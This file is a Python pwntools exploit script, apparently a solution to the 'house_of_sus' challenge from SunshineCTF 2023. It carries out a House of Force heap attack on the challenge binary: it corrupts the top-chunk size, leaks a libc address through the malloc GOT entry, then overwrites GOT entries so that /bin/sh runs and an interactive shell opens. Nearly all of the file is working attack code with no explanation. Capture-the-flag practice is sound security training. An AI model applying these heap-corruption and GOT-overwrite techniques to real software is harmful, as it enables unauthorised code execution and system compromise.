#!/usr/bin/env python3

from pwn import *
import random

exe = "./house_of_sus"
elf = ELF("./house_of_sus")
libc = ELF("./libc.so.6")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "INFO"

gdbscript = """
define hv
heap-view
end
define av
x/16gx &main_arena
end
define wv
x/64gx 0x405000
end
continue
"""

if args.REMOTE:
    p = remote("chal.2023.sunshinectf.games", 23001)

elif args.DEBUG:
    p = gdb.debug([exe], gdbscript=gdbscript)
elif args.RUN:
    p = process([exe])
else:
    p = process([exe])
    gdb.attach(p, gdbscript=gdbscript)


def malloc(size: int, content: bytes):
    p.recvuntil(b"Call an emergency meeting")
    p.recvline()
    p.recvline()
    p.sendline(b"3")  # choose option 3 for call meeting
    p.recvline()
    p.sendline(str(size).encode())
    p.sendline(content)
    p.recvuntil(b"responded: ")  # responded
    print(b"Responded :: " + p.recv(32))
    print(p.recvuntil(b"(You)"))  # end of vote menu
    p.sendline(b"21")  # vote
    p.recvline()  # newline
    p.recvline()  # newline
    p.recvline()  # Enter your choice:
    p.recvline()  # You voted to


def leak():
    p.sendline(b"1")
    p.recvuntil(b": ")
    p.recvline()
    malloc_libc = u64(p.recvline()[:-1].ljust(8, b"\x00"))
    info(f"Leaked libc malloc: {malloc_libc:#0x}")
    return malloc_libc


def main():
    p.recvuntil(b"you will be joining game:")

    heapBase = int(p.recv(10), 0) - 0x660
    malloc_got = elf.got["malloc"]

    info(f"HeapBase : {heapBase:#0x}")

    p.recvuntil(b"\x0a\x0a")

    # do task
    p.sendline(b"1")
    p.recvline()

    # get seed
    p.sendline(b"2")
    p.recvuntil(b"here's the seed: ")

    seed = int(p.recvline().strip(), 0)
    info(f"Game seed : {seed}")
    info(f"malloc@got : {malloc_got:#0x}")

    random.seed(seed)

    ######################### HOUSE OF FORCE ####################
    p.recvuntil(b"\nPick who you think is the IMPOSTER:\n\n")
    p.sendline(b"1")  # vote imposter

    malloc(0x10, b"C" * 0x10)
    malloc(0x10, b"D" * 0x18 + p64(0xFFFFFFFFFFFFFFFF))
    distance = 0x4050D0 - heapBase - 0x1700 + 0x40

    malloc(distance, b"Z" * 8)

    ######################### INFO LEAK #########################
    malloc(0x20, p64(malloc_got) * 5 + b"\xff" * 8)

    leakAddr = leak()
    mallocLibc = leakAddr
    libcBase = leakAddr - libc.symbols["malloc"]
    libc.address = libcBase
    info(f"malloc libc : {mallocLibc:#0x}")
    info(f"libcBase: {libcBase:#0x}")
    putsPLT = libc.symbols["puts"]
    fgetsPLT = libc.symbols["fgets"]
    scanfPLT = libc.address + 0x7BE70  # __isoc99_scanf
    imposter = elf.symbols["be_imposter"]  # imposter function

    info(f"puts @ LIBC : {putsPLT:#0x}")
    binsh = next(libc.search(b"/bin/sh"))
    info(f"/bin/sh is at libc address : {binsh:#0x}")

    ######################### GROOM HEAP #########################
    distance = 0x405010 - 0x405190 + 0xA0
    malloc(distance, b"")

    malloc(0x20, p64(fgetsPLT) + p64(0x401090) + p64(imposter) + p64(scanfPLT))

    p.sendline(b"3")
    p.sendline(str(binsh).encode())

    p.interactive()


if __name__ == "__main__":
    main()
